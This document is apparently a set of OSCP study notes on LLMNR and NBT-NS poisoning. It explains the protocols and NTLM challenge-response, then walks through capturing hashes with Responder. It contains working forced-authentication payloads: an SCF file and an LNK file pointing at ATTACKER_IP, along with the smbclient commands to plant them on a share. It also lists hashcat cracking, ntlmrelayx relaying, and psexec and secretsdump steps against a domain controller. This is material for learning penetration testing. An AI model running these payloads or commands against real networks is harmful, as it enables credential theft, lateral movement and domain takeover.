# 📘 LLMNR & NBT-NS Poisoning — Complete Deep Notes (OSCP Level)

---

# SECTION 1: THE BASICS — Understanding the Foundation

## 1.1 What is DNS?

Think of DNS (Domain Name System) as a phone book for the internet and your local network.
When you type \\fileserver or \\CORP-DC01 in Windows Explorer, your computer needs to find the IP address of that machine. It asks DNS first.


```bash
\\fileserver
```

System performs:

```bash
PC → DNS Server → IP Address → Connection
```

---

## 1.2 What is LLMNR?

LLMNR = Link-Local Multicast Name Resolution
LLMNR is a fallback protocol. When DNS fails to resolve a name, Windows doesn't give up — it broadcasts a question to the entire local network:

"Hey, does anyone know the IP address of 'FILESERVER01'?"

Any machine on the network can respond.
```bash
LLMNR Resolution Flow:
Your PC → asks DNS → DNS says "I don't know"
Your PC → broadcasts via LLMNR to entire subnet → "Does anyone know FILESERVER01?"
Any machine can reply → "Yes! I am FILESERVER01, my IP is X.X.X.X"
```

Key Facts about LLMNR:
Uses UDP port 5355
Works only on the local subnet (link-local = same network segment)
Enabled by default on Windows Vista and later
No authentication — anyone can answer

---

## 1.3 What is NBT-NS?

NBT-NS = NetBIOS Name Service — an older, similar protocol.

Uses UDP port 137
Even older than LLMNR
Also enabled by default
Also broadcasts on local network
Also has zero verification

Both LLMNR and NBT-NS are fallback mechanisms. Both are exploitable the same way.

### Key Facts:

* UDP Port: **137**
* Broadcast-based
* Legacy protocol
* ❌ No verification

---

## 1.4 Why LLMNR Exists?

LLMNR was designed for small networks or home environments where setting up a full DNS server is impractical. It lets machines discover each other automatically on a local network without administrator setup.
In enterprise environments, it is largely unnecessary because proper DNS is configured — but it remains enabled by default, making it a persistent security risk.


---

## 1.5 Why LLMNR is Vulnerable?

The fundamental problem: No verification.
When your PC broadcasts "Who is FILESERVER01?", it will trust any response it gets back. There is no cryptographic proof, no authentication, no way to verify the responder is legitimate.
This is the vulnerability that makes the entire attack possible.


---

# SECTION 2: NTLM & HASHES

## 2.1 What is Hash?

```bash
Password: Summer2024!
Hash:     a87f3b2c9d...
```

✔ One-way
✔ Can brute-force

---
## What is NTLM?

NTLM = NT LAN Manager — Windows' legacy authentication protocol.

When you connect to a Windows share or service, Windows doesn't send your password directly. It uses a challenge-response system:
Step 1: Client says "I want to authenticate as USER"
Step 2: Server sends a random "challenge" number
Step 3: Client computes: NTLM_Hash(password) + Challenge = Response
Step 4: Client sends Response to server
Step 5: Server verifies the Response

NTLMv2 is the newer version — it adds a client-side challenge too, making it harder to crack, but the fundamental mechanism is the same.
Why this matters for our attack: If an attacker can position themselves as the "server" in step 2, they receive the NTLMv2 hash in step 4. That hash can be cracked offline or relayed.


## 2.2 NTLM Authentication Flow

```bash
1. Client → "I am USER"
2. Server → sends challenge
3. Client → computes response
4. Client → sends response
5. Server → verifies
```

---

## 2.3 What Attacker Captures

The attacker captures the NTLMv2 Net-Hash — specifically:

The username
The domain name
The challenge (which the attacker sent)
The response (which contains the hash of the password)

This is NOT the actual password. But it can be:

Cracked offline using hashcat
Relayed to other machines for authentication (without cracking)


---

# SECTION 3: LLMNR POISONING

## 3.1 Simple Real-Life Analogy
Imagine you're in an office and you shout out loud:

"Hey, does anyone know where John's desk is?"

A malicious person in the office (who heard your question) runs up to you first and says:

"Yes! I'm John, follow me!"

You follow them. They are NOT John. But you believed them because no one verified it.
Now they ask you:

"Before I show you John's desk, please prove who you are — tell me your name and credentials."

You hand over your credentials. Attack successful.
This is exactly LLMNR Poisoning.


## Attack Flow

```bash
1. Victim PC tries to access \\FILESERVER01 (a typo or non-existent share)
2. DNS doesn't know FILESERVER01 → fails
3. Victim broadcasts LLMNR: "Who is FILESERVER01?"
4. Attacker (Responder) hears broadcast, replies: "I am FILESERVER01! IP: [Attacker IP]"
5. Victim trusts the response, tries to authenticate to Attacker
6. Windows automatically sends NTLMv2 credentials to Attacker
7. Attacker captures the hash

```
## 3.3 What Vulnerability Does It Abuse?

No authentication on LLMNR responses — anyone can claim to be any host
Windows automatic credential forwarding — Windows automatically sends credentials when connecting to network resources
LLMNR enabled by default — no admin action needed to be vulnerable


---

# SECTION 4: ATTACK CONDITIONS

## Works When:

* Same subnet
* Windows system
* LLMNR enabled
* DNS failure occurs

## Fails When:

* LLMNR disabled
* Different network
* No traffic
* SMB signing enforced

---

# SECTION 5: FULL ATTACK FLOW

Phase 1: Reconnaissance
├── nmap -sC -sV -p- [target range]
├── Identify Windows machines
├── Identify domain name
└── Identify services (SMB, LDAP, Kerberos → AD confirmed)

Phase 2: Initial Access
├── Find exploitable service (web app, SMB vuln, etc.)
├── Exploit → get shell on foothold machine
└── Establish persistent access (optional in exam)

Phase 3: Internal Enumeration
├── Run: ipconfig /all  (find subnet, domain)
├── Run: net user /domain
├── Run: net group "Domain Admins" /domain
└── Identify other machines on network

Phase 4: LLMNR Poisoning (Credential Capture)
├── Start Responder on attacker machine
├── Wait for or trigger LLMNR broadcast
├── Capture NTLMv2 hash
└── Save hash to file

Phase 5: Hash Exploitation
├── Option A: Crack hash with hashcat → use plaintext password
└── Option B: Relay hash with ntlmrelayx → direct shell

Phase 6: Lateral Movement
├── Use cracked credentials for SMB, RDP, WinRM
├── Access more machines
└── Eventually reach Domain Controller → Domain Admin


---

# SECTION 6: RESPONDER

Responder is a tool written in Python that poisons LLMNR, NBT-NS, and MDNS responses and sets up rogue servers (SMB, HTTP, FTP, LDAP, etc.) to capture authentication hashes.
Think of it as: a fake server that pretends to be every service on the network simultaneously.


## Installation

```bash
# Check if installed
which responder

# Update/install
sudo apt update
sudo apt install responder -y

# Or clone from GitHub
git clone https://github.com/lgandx/Responder
cd Responder
```
## 6.1 How Responder Works Internally
When you run Responder, it:

Listens on the network interface for LLMNR/NBT-NS broadcast queries
Replies to every query saying "I am that host, my IP is [attacker IP]"
Starts fake servers: SMB server, HTTP server, FTP server, LDAP server, etc.
When victims connect to these fake servers (thinking they're real), Responder captures the NTLMv2 authentication attempt
Saves all captured hashes to /usr/share/responder/logs/


---

## Main Command

```bash
sudo responder -I tun0 -rdwv
```

---

## Flags

| Flag | Meaning | Why Used |
|------|--------|----------|
| -I tun0 | Interface to listen on | Specifies which network card to use |
| -r | Enable answers for netbios wredir requests | Catches additional NetBIOS queries |
| -d | Enable answers for domain-level NetBIOS queries | Catches domain queries too |
| -w | Start WPAD (Web Proxy Auto-Discovery) rogue server | Catches browsers looking for proxy settings |
| -v | Verbose output | Shows all captured requests in real time |

---

## Interface

```bash
ip a
```

* tun0 → VPN network ✅
* eth0 → local network ❌

---


# SECTION 7: HASH CAPTURE FLOW

```bash
Step 1: User on victim PC types \\FILESERVERR (typo - doesn't exist)

Step 2: Victim PC asks DNS: "What is the IP of FILESERVERR?"
        DNS Server: "I have no record of FILESERVERR" → FAIL

Step 3: Victim PC sends LLMNR broadcast (UDP 5355) to 224.0.0.252:
        "Anyone on this network know the IP of FILESERVERR?"

Step 4: Responder (on attacker machine) hears this broadcast
        Responder replies: "Yes! I am FILESERVERR. My IP is 10.10.14.5 (attacker IP)"

Step 5: Victim PC trusts this response (no verification exists)
        Victim PC tries to connect to attacker's IP on SMB port 445

Step 6: Responder's fake SMB server receives the connection
        SMB server sends a challenge to victim

Step 7: Victim's Windows automatically responds with NTLMv2 authentication:
        - Username
        - Domain
        - Challenge (from attacker)
        - NTLMv2 Response (derived from user's password hash)

Step 8: Responder captures and logs this entire exchange
        Hash saved to: /usr/share/responder/logs/
```

---

# SECTION 8: PAYLOADS (VERY IMPORTANT)  TRIGGERING THE ATTACK — What If No Traffic?


## 9.1 SCF FILE PAYLOAD (AUTO TRIGGER)

Create file: **@malicious.scf**

```bash
[Shell]
Command=2
IconFile=\\ATTACKER_IP\share\icon.ico
[Taskbar]
Command=ToggleDesktop
```

### Upload to Share:

```bash
smbclient //TARGET_IP/Share -U anonymous
put @malicious.scf
```

### Working:

* User opens folder
* Windows loads icon
* SMB request sent to attacker
* Hash captured

---

## 8.2 LNK FILE PAYLOAD

### Using Tool:

```bash
python3 lnkbomb.py -i ATTACKER_IP -o malicious.lnk
```

### Manual (PowerShell):

```bash
$obj = New-object -comobject wscript.shell
$link = $obj.createshortcut("C:\temp\malicious.lnk")
$link.targetpath = "\\ATTACKER_IP\share\payload"
$link.save()
```

---

## 8.3 WPAD ATTACK

Run Responder with:

```bash
sudo responder -I tun0 -rdwv
```

### Working:

* Browser searches proxy automatically
* Attacker responds
* Browser sends NTLM credentials

---

## 8.4 FORCED AUTH VIA SMB PATH

Example:

```bash
\\ATTACKER_IP\share
```

Used in:

* Emails
* Scripts
* Social engineering

---

# SECTION 9: SCENARIOS

## Scenario 1: Normal

```bash
sudo responder -I tun0 -rdwv
```

Wait → hashes appear

---

## Scenario 2: No Traffic

```bash
crackmapexec smb 10.10.10.0/24 --shares -u '' -p ''

smbclient //10.10.10.50/Shared -N
put @malicious.scf
```

---

## Scenario 3: Pivot

```bash
powershell -ep bypass
Import-Module .\Inveigh.ps1
Invoke-Inveigh -LLMNR Y -NBNS Y -ConsoleOutput Y
```

---

# SECTION 10: HASH EXPLOITATION

## Crack Has0

```bash
hashcat -m 5600 hash.txt rockyou.txt --force
```

---

## Validate Credentials

```bash
crackmapexec smb 10.10.10.0/24 -u user -p password
```

---

## Remote Access

```bash
evil-winrm -i TARGET_IP -u user -p password
```

---

## Pass-the-Hash / Relay

```bash
ntlmrelayx.py -tf targets.txt -smb2support
```

---

## SECTION 11: OSCP REAL EXAM WALKTHROUGH
Target: 10.10.10.0/24 — AD Environment

## Step 1: Scan

```bash
nmap -sC -sV -p 53,88,135,139,389,445,636,3268 10.10.10.0/24

# Result: 10.10.10.1 (DC), 10.10.10.50 (workstation), 10.10.10.75 (file server)
# Port 88 (Kerberos) and 389 (LDAP) on .1 confirms Active Directory
```
 Found web app on 10.10.10.75 port 80
 Exploited file upload → web shell → reverse shell
 Now have shell as: CORP\webservice (low privilege)
 Note: I'm "inside" the network now
 
---

## Step 2: Start Responder

```bash
# Open second terminal, start Responder right away
sudo responder -I tun0 -rdwv
```

---

## Step 3: Capture Hash

```bash
# After 10 minutes, Responder shows:
[SMB] NTLMv2-SSP Client   : 10.10.10.50
[SMB] NTLMv2-SSP Username : CORP\jsmith
[SMB] NTLMv2-SSP Hash     : jsmith::CORP:4B3A2D1E0F9A8B7C:C1D2E3F4...

```

---

## Step 4: Crack

```bash
hashcat -m 5600 jsmith.txt rockyou.txt
```

---

## Step 5: Use Credentials

```bash
crackmapexec smb 10.10.10.0/24 -u jsmith -p 'Password123!'
```

---

## Step 6: Domain Compromise

```bash
python3 psexec.py CORP/jsmith:'Password123!'@DC_IP
```

---

## Step 7: Dump Hashes

```bash
python3 secretsdump.py CORP/jsmith:'Password123!'@DC_IP
```

---

# SECTION 12: TROUBLESHOOTING

## No Hash?

Check:

```bash
ip a
```

* Correct interface?
* Same network?
* LLMNR enabled?

---

## Common Mistakes

* Using eth0 instead of tun0
* No traffic generated
* Wrong subnet

---

# 📝 CUSTOM NOTES

Enter topic:

```bash
__________
```
